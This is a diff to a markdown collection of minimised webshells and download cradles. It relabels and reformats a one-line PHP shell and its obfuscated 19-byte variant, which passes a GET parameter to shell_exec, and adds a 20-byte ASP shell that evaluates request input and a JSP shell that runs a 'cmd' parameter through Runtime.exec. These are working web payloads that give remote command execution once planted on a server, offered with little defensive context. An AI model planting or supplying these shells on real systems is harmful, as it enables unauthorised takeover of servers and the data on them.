@@ -2,7 +2,7 @@
 
 All kinds of tiny shells or download cradles. It's all about minimization.
 
-## PHP - Webshell (19 bytes)
+## PHP - Obfuscated Webshell (19 bytes)
 
 Source: https://gist.github.com/0xSojalSec/5bee09c7035985ddc13fddb16f191075
 
@@ -21,10 +21,10 @@ string because of non-ascii characters.
  Explanation:
  * ~"\xa0\xb8\xba\xab" <-> "_GET"
  * ${"_GET"}["\xa0"] <-> $_GET["\xa0"]
- * `{$_GET["\xa0"]}` <-> shell_exec($_GET["\xa0"])
+ * \`{$_GET["\xa0"]}\` <-> shell_exec($_GET["\xa0"])
  
 This is only 5 bytes longer than the shortest PHP shell (using $_GET to smuggle data)! 
-``` 
+```php
 <?=`$_GET[_]`;
 ```
   
@@ -48,3 +48,20 @@ Explanation:
 * `iex` = Invoke-Expression
 
 Author: https://twitter.com/johnxor2
+
+## ASP - Webshell (20 bytes)
+
+Author unknown:
+
+```javascript
+<%eval request(0)%>
+```
+
+## JSP - Webshell (60 bytes)
+
+Nothing fancy in here, just execution of the passed parameter since the language doesn't allow further abriviations.
+
+```Java
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+```
+
